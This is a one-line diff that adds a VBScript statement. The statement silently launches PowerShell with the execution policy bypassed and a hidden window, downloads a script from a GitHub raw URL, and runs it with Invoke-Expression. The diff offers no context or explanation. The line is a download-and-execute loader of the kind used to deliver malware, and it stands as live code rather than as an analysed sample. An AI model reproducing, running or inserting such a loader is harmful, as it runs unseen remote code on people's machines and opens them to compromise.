@@ -1,0 +1,1 @@
+CreateObject("WScript.Shell").Run "powershell -NoProfile -ExecutionPolicy Bypass -Command ""Invoke-Expression ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/IncsecRishie/wdwddwdw/main/script.ps1'))""", 0
